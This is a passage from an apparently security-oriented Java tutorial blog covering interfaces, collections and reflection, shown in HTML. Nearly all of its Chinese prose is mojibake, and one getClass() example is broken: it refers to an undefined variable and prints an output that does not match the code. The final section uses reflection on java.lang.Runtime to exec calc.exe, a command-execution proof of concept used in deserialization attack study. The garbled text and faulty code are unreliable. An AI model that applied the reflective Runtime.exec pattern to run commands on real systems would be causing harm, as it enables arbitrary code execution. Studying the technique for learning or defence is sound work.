abstractï¼Œå…¶ä»–ä¿®é¥°ç¬¦éƒ½ä¼šæŠ¥é”™ï¼‰ã€‚</li><li>æ¥å£ä¸­å¯ä»¥å«æœ‰å˜é‡ï¼Œä½†æ˜¯æ¥å£ä¸­çš„å˜é‡ä¼šè¢«éšå¼çš„æŒ‡å®šä¸º <strong>public static final</strong> å˜é‡ï¼ˆå¹¶ä¸”åªèƒ½æ˜¯ publicï¼Œç”¨ private ä¿®é¥°ä¼šæŠ¥ç¼–è¯‘é”™è¯¯ï¼‰ã€‚</li><li>æ¥å£ä¸­çš„æ–¹æ³•æ˜¯ä¸èƒ½åœ¨æ¥å£ä¸­å®ç°çš„ï¼Œåªèƒ½ç”±å®ç°æ¥å£çš„ç±»æ¥å®ç°æ¥å£ä¸­çš„æ–¹æ³•ã€‚</li></ul><h4 id="æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«"><a href="#æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«" class="headerlink" title="æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«"></a>æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«</h4><ul><li><ol><li>æŠ½è±¡ç±»ä¸­çš„æ–¹æ³•å¯ä»¥æœ‰æ–¹æ³•ä½“ï¼Œå°±æ˜¯èƒ½å®ç°æ–¹æ³•çš„å…·ä½“åŠŸèƒ½ï¼Œä½†æ˜¯æ¥å£ä¸­çš„æ–¹æ³•ä¸è¡Œã€‚</li></ol></li><li><ol start="2"><li>æŠ½è±¡ç±»ä¸­çš„æˆå‘˜å˜é‡å¯ä»¥æ˜¯å„ç§ç±»å‹çš„ï¼Œè€Œæ¥å£ä¸­çš„æˆå‘˜å˜é‡åªèƒ½æ˜¯ <strong>public static final</strong> ç±»å‹çš„ã€‚</li></ol></li><li><ol start="3"><li>æ¥å£ä¸­ä¸èƒ½å«æœ‰é™æ€ä»£ç å—ä»¥åŠé™æ€æ–¹æ³•(ç”¨ static ä¿®é¥°çš„æ–¹æ³•)ï¼Œè€ŒæŠ½è±¡ç±»æ˜¯å¯ä»¥æœ‰é™æ€ä»£ç å—å’Œé™æ€æ–¹æ³•ã€‚</li></ol></li><li><ol start="4"><li>ä¸€ä¸ªç±»åªèƒ½ç»§æ‰¿ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œè€Œä¸€ä¸ªç±»å´å¯ä»¥å®ç°å¤šä¸ªæ¥å£ã€‚</li></ol></li></ul></blockquote><h3 id="æ¥å£çš„å®ç°"><a href="#æ¥å£çš„å®ç°" class="headerlink" title="æ¥å£çš„å®ç°"></a>æ¥å£çš„å®ç°</h3><p>å½“ç±»å®ç°æ¥å£çš„æ—¶å€™ï¼Œç±»è¦å®ç°æ¥å£ä¸­æ‰€æœ‰çš„æ–¹æ³•ã€‚å¦åˆ™ï¼Œç±»å¿…é¡»å£°æ˜ä¸ºæŠ½è±¡çš„ç±»ã€‚</p><p>Animal.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dog.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog eat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog travel&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog.eat();</span><br><span class="line">        dog.travel();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º Dog eat</span></span><br><span class="line"><span class="comment">//   Dog travel</span></span><br></pre></td></tr></table></figure><h3 id="æ¥å£çš„å¤šç»§æ‰¿"><a href="#æ¥å£çš„å¤šç»§æ‰¿" class="headerlink" title="æ¥å£çš„å¤šç»§æ‰¿"></a>æ¥å£çš„å¤šç»§æ‰¿</h3><p>åœ¨Javaä¸­ï¼Œç±»çš„å¤šç»§æ‰¿æ˜¯ä¸åˆæ³•ï¼Œä½†æ¥å£å…è®¸å¤šç»§æ‰¿ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hockey</span> <span class="keyword">extends</span> <span class="title class_">Sports</span>, Event</span><br></pre></td></tr></table></figure><h2 id="é›†åˆ"><a href="#é›†åˆ" class="headerlink" title="é›†åˆ"></a>é›†åˆ</h2><p>åœ¨Javaä¸­ï¼Œé›†åˆï¼ˆCollectionï¼‰æ˜¯ä¸€ç§ç”¨äºå­˜å‚¨å’Œæ“ä½œä¸€ç»„å¯¹è±¡çš„æ•°æ®ç»“æ„ã€‚é›†åˆæ¡†æ¶ï¼ˆCollection Frameworkï¼‰æ˜¯Javaä¸­çš„ä¸€ä¸ªé‡è¦éƒ¨åˆ†ï¼Œæä¾›äº†ä¸€ç³»åˆ—æ¥å£å’Œç±»ï¼Œç”¨äºè¡¨ç¤ºå’Œæ“ä½œä¸åŒç±»å‹çš„é›†åˆã€‚Javaçš„é›†åˆæ¡†æ¶ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ¥å£å’Œç±»ï¼š</p><ol><li><strong>Collection æ¥å£ï¼š</strong> æ˜¯æ‰€æœ‰é›†åˆæ¡†æ¶çš„æ ¹æ¥å£ï¼Œå®ƒå®šä¹‰äº†ä¸€äº›åŸºæœ¬çš„æ–¹æ³•ï¼Œå¦‚æ·»åŠ ã€åˆ é™¤ã€éå†ç­‰ã€‚<code>List</code>ã€<code>Set</code> å’Œ <code>Queue</code> æ¥å£éƒ½ç»§æ‰¿è‡ª <code>Collection</code>ã€‚</li><li><strong>List æ¥å£ï¼š</strong> ç»§æ‰¿è‡ª <code>Collection</code>ï¼Œè¡¨ç¤ºæœ‰åºçš„é›†åˆï¼Œå…è®¸åŒ…å«é‡å¤å…ƒç´ ã€‚å¸¸è§çš„å®ç°ç±»åŒ…æ‹¬ <code>ArrayList</code>ã€<code>LinkedList</code> å’Œ <code>Vector</code>ã€‚</li><li><strong>Set æ¥å£ï¼š</strong> ä¹Ÿç»§æ‰¿è‡ª <code>Collection</code>ï¼Œè¡¨ç¤ºä¸åŒ…å«é‡å¤å…ƒç´ çš„é›†åˆã€‚å¸¸è§çš„å®ç°ç±»åŒ…æ‹¬ <code>HashSet</code>ã€<code>LinkedHashSet</code> å’Œ <code>TreeSet</code>ã€‚</li><li><strong>Queue æ¥å£ï¼š</strong> ç»§æ‰¿è‡ª <code>Collection</code>ï¼Œè¡¨ç¤ºä¸€ç§é˜Ÿåˆ—çš„æ•°æ®ç»“æ„ï¼Œå¸¸è§çš„å®ç°ç±»åŒ…æ‹¬ <code>LinkedList</code> å’Œ <code>PriorityQueue</code>ã€‚</li><li><strong>Map æ¥å£ï¼š</strong> è¡¨ç¤ºé”®å€¼å¯¹çš„é›†åˆï¼Œæ¯ä¸ªé”®æ˜ å°„åˆ°ä¸€ä¸ªå€¼ã€‚å¸¸è§çš„å®ç°ç±»åŒ…æ‹¬ <code>HashMap</code>ã€<code>LinkedHashMap</code>ã€<code>TreeMap</code> å’Œ <code>HashTable</code>ã€‚</li></ol><h1 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h1><p>åå°„æœ‰å…³çš„APIï¼š</p><blockquote><p>java.lang.Class: ä»£è¡¨ä¸€ä¸ªç±»<br>java.lang.reflect.Method: ä»£è¡¨ç±»çš„æ–¹æ³•<br>java.lang.relect.Field: ä»£è¡¨ç±»çš„æˆå‘˜å˜é‡<br>java.lang.reflect.Constructor: ä»£è¡¨ç±»çš„æ„é€ å™¨</p></blockquote><p>ç”±äºClassç±»æ˜¯privateç§æœ‰å±æ€§, å…¶æ„é€ å™¨æ˜¯ç§æœ‰çš„, æˆ‘ä»¬æ— æ³•ç›´æ¥new Class();å›´ç»•å¦‚ä½•è·å–Classç±»çš„å¯¹è±¡æ¥å­¦ä¹ åå°„æœºåˆ¶</p><h2 id="ç±»çš„-classå±æ€§"><a href="#ç±»çš„-classå±æ€§" class="headerlink" title="ç±»çš„.classå±æ€§"></a>ç±»çš„.classå±æ€§</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Person.class;  <span class="comment">///////////////////////</span></span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¾“å‡º: class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><h2 id="å®ä¾‹åŒ–å¯¹è±¡çš„getClass-æ–¹æ³•"><a href="#å®ä¾‹åŒ–å¯¹è±¡çš„getClass-æ–¹æ³•" class="headerlink" title="å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•"></a>å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> p1.getClass(); <span class="comment">/////////////////</span></span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º: I am n4c1, and I am 19 years old.</span></span><br><span class="line"><span class="comment">//class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><h2 id="Class-forName-String-className-ï¼šåŠ¨æ€åŠ è½½ç±»"><a href="#Class-forName-String-className-ï¼šåŠ¨æ€åŠ è½½ç±»" class="headerlink" title="Class.forName(String className)ï¼šåŠ¨æ€åŠ è½½ç±»"></a>Class.forName(String className)ï¼šåŠ¨æ€åŠ è½½ç±»</h2><p>è°ƒç”¨Classç±»ä¸­çš„forNameæ–¹æ³•ï¼Œå°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½è¿›å†…å­˜ï¼Œè¿”å›Classå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.n4c1.www.Person&quot;</span>);</span><br><span class="line">        System.out.println(c3.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¾“å‡º: class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><blockquote><p>ä½†åœ¨è¿™ä¸‰ç§è·å–CLassç±»æ–¹å¼ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ç¬¬ä¸‰ç§é€šè¿‡Class.forNameæ–¹æ³•å»åŠ¨æ€åŠ è½½ç±»ã€‚ä¸”ä½¿ç”¨forNameå°±ä¸éœ€è¦importå¯¼å…¥å…¶ä»–ç±»ï¼Œå¯ä»¥åŠ è½½æˆ‘ä»¬ä»»æ„çš„ç±»ã€‚</p><p>è€Œä½¿ç”¨ç±».classå±æ€§ï¼Œéœ€è¦å¯¼å…¥ç±»çš„åŒ…ï¼Œä¾èµ–æ€§å¤ªå¼ºï¼Œåœ¨å¤§å‹é¡¹ç›®ä¸­å®¹æ˜“æŠ›å‡ºç¼–è¯‘é”™è¯¯ï¼›</p><p>è€Œä½¿ç”¨å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•ï¼Œéœ€è¦æœ¬èº«åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œæœ¬èº«å°±æ²¡æœ‰äº†ä½¿ç”¨åå°„æœºåˆ¶æ„ä¹‰ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨è·å–classå¯¹è±¡ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨Class.forNameæ–¹æ³•å»è·å–ã€‚</p></blockquote><h2 id="è·å–æˆå‘˜å˜é‡Field"><a href="#è·å–æˆå‘˜å˜é‡Field" class="headerlink" title="è·å–æˆå‘˜å˜é‡Field"></a>è·å–æˆå‘˜å˜é‡Field</h2><blockquote><p>è·å–æˆå‘˜å˜é‡Fieldä½äºjava.lang.reflect.FieldåŒ…ä¸­</p><p>Field[] getFields() ï¼šè·å–æ‰€æœ‰publicä¿®é¥°çš„æˆå‘˜å˜é‡</p><p>Field[] getDeclaredFields() è·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°ç¬¦</p><p>Field getField(String name) è·å–æŒ‡å®šåç§°çš„ publicä¿®é¥°çš„æˆå‘˜å˜é‡</p><p>Field getDeclaredField(String name) è·å–æŒ‡å®šçš„æˆå‘˜å˜é‡</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.n4c1.www.Person&quot;</span>);</span><br><span class="line">        System.out.println(c3.getName());</span><br><span class="line"></span><br><span class="line">        Field[] fieldArray1 = c3.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fieldArray1) &#123;</span><br><span class="line">            System.out.println(field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡º:</span></span><br><span class="line"><span class="comment">// com.n4c1.www.Person</span></span><br><span class="line"><span class="comment">// name</span></span><br><span class="line"><span class="comment">// age</span></span><br></pre></td></tr></table></figure><h2 id="è·å–æˆå‘˜æ–¹æ³•Method"><a href="#è·å–æˆå‘˜æ–¹æ³•Method" class="headerlink" title="è·å–æˆå‘˜æ–¹æ³•Method"></a>è·å–æˆå‘˜æ–¹æ³•Method</h2><blockquote><p><strong>Method getMethod(String name, ç±»&lt;?&gt;â€¦ parameterTypes)</strong> &#x2F;&#x2F;è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„publicæ–¹æ³•</p><p><strong>Method getDeclaredMethod(String name, ç±»&lt;?&gt;â€¦ parameterTypes)</strong> &#x2F;&#x2F;è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„æ‰€æœ‰æ–¹æ³•</p><p>&#x2F;&#x2F;ç¬¬ä¸€ä¸ªå‚æ•°è·å–è¯¥æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°è·å–æ ‡è¯†è¯¥æ–¹æ³•çš„å‚æ•°ç±»å‹</p><p><strong>Method[] getMethods()</strong> &#x2F;&#x2F;è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³•</p><p><strong>Method[] getDeclaredMethods()</strong> &#x2F;&#x2F; è·å–è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•</p></blockquote><h2 id="è·å–æ„é€ å‡½æ•°Constructor"><a href="#è·å–æ„é€ å‡½æ•°Constructor" class="headerlink" title="è·å–æ„é€ å‡½æ•°Constructor"></a>è·å–æ„é€ å‡½æ•°Constructor</h2><blockquote><p>Constructor&lt;?&gt;[] getConstructors() ï¼šåªè¿”å›publicæ„é€ å‡½æ•°</p><p>Constructor&lt;?&gt;[] getDeclaredConstructors() ï¼šè¿”å›æ‰€æœ‰æ„é€ å‡½æ•°</p><p>Constructor&lt;&gt; getConstructor(ç±»&lt;?&gt;â€¦ parameterTypes) : åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„publicæ„é€ å‡½æ•°</p><p>Constructor&lt;&gt; getDeclaredConstructor(ç±»&lt;?&gt;â€¦ parameterTypes) ï¼š åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„æ„é€ å‡½æ•°</p></blockquote><h2 id="é€šè¿‡åå°„æ¥ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡"><a href="#é€šè¿‡åå°„æ¥ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="é€šè¿‡åå°„æ¥ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡"></a>é€šè¿‡åå°„æ¥ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡</h2><h3 id="newInstance-æ–¹æ³•åˆ›å»ºç±»å¯¹è±¡"><a href="#newInstance-æ–¹æ³•åˆ›å»ºç±»å¯¹è±¡" class="headerlink" title="newInstance()æ–¹æ³•åˆ›å»ºç±»å¯¹è±¡"></a>newInstance()æ–¹æ³•åˆ›å»ºç±»å¯¹è±¡</h3><h3 id="invoke-æ‰§è¡Œç±»å¯¹è±¡æ–¹æ³•"><a href="#invoke-æ‰§è¡Œç±»å¯¹è±¡æ–¹æ³•" class="headerlink" title="invoke()æ‰§è¡Œç±»å¯¹è±¡æ–¹æ³•"></a>invoke()æ‰§è¡Œç±»å¯¹è±¡æ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reflectMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åå°„æµ‹è¯•æˆåŠŸ!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.reflect.ReflectTest&quot;</span>); <span class="comment">// åˆ›å»ºClasså¯¹è±¡</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance(); <span class="comment">// åˆ›å»ºç±»å®ä¾‹å¯¹è±¡</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;reflectMethod&quot;</span>); <span class="comment">// è·å–reflectMethodæ–¹æ³•</span></span><br><span class="line">            method.invoke(m); <span class="comment">// è°ƒç”¨ç±»å®ä¾‹å¯¹è±¡æ–¹æ³•</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ"><a href="#åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ" class="headerlink" title="åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ"></a>åˆ©ç”¨åå°„æ„é€ Runtimeç±»æ‰§è¡Œ</h2><p>åå°„å¼¹è®¡ç®—å™¨</p><p><code>C:\\WINDOWS\\System32\\calc.exe</code></p><p>Runtimeç±»çš„æ„é€ æ–¹æ³•æ˜¯privateæƒé™ç§æœ‰çš„,åå°„æœºåˆ¶ä¹Ÿæ˜¯æœ‰é™åˆ¶çš„ï¼Œå¹¶ä¸èƒ½é¥¶è¿‡privateæƒé™çš„æ£€æŸ¥ã€‚</p><p>å› æ­¤æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨newInstance()æ¥åˆ›å»ºä¸€ä¸ªå¯¹è±¡Runtime()</p><p>ä½†æ˜¯å¯ä»¥ç›´æ¥è°ƒç”¨å…¶ç±»æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">RuntimeMethod</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>);<span class="comment">//é€šè¿‡ getMethod æ–¹æ³•è·å– Runtime ç±»ä¸­çš„ getRuntime æ–¹æ³•çš„ Method å¯¹è±¡ã€‚è¿™ä¸ªæ–¹æ³•ç”¨äºè·å–å½“å‰è¿è¡Œæ—¶å¯¹è±¡ã€‚</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> RuntimeMethod.invoke(c1); <span class="comment">//ä½¿ç”¨åå°„è°ƒç”¨ getRuntime æ–¹æ³•ï¼Œå¾—åˆ° Runtime ç±»çš„å®ä¾‹ã€‚invoke æ–¹æ³•ç”¨äºè°ƒç”¨æŒ‡å®šå¯¹è±¡çš„æ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨äº† getRuntime æ–¹æ³•ã€‚</span></span><br><span class="line">        method.invoke(m, <span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€åŒ–:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(c1),<span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="è®¾ç½®setAccessible-true-æš´åŠ›è®¿é—®æƒé™"><a href="#è®¾ç½®setAccessible-true-æš´åŠ›è®¿é—®æƒé™" class="headerlink" title="è®¾ç½®setAccessible(true)æš´åŠ›è®¿é—®æƒé™"></a>è®¾ç½®setAccessible(true)æš´åŠ›è®¿é—®æƒé™</h2><blockquote><p>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„æœºåˆ¶ä¸èƒ½å¯¹ç±»çš„ç§æœ‰privateå­—æ®µè¿›è¡Œæ“ä½œï¼Œç»•è¿‡ç§æœ‰æƒé™çš„è®¿é—®ã€‚ä½†ä¸€äº›ç‰¹æ®Šåœºæ™¯å­˜åœ¨ä¾‹å¤–çš„æ—¶å€™ï¼Œæ¯”å¦‚æˆ‘ä»¬è¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„æ—¶å€™ï¼Œéœ€è¦å»è®¿é—®è¿™äº›å—é™çš„ç§æœ‰å­—æ®µï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨AccessibleObjectä¸Šçš„setAccessible()æ–¹æ³•æ¥å…è®¸è®¿é—®ã€‚</p><p>Java.lang.reflect.AccessibleObjectç±»æ˜¯Fieldï¼ŒMethodå’ŒConstructorç±»å¯¹è±¡çš„åŸºç±»ï¼Œå¯ä»¥æä¾›å°†åå°„å¯¹è±¡æ 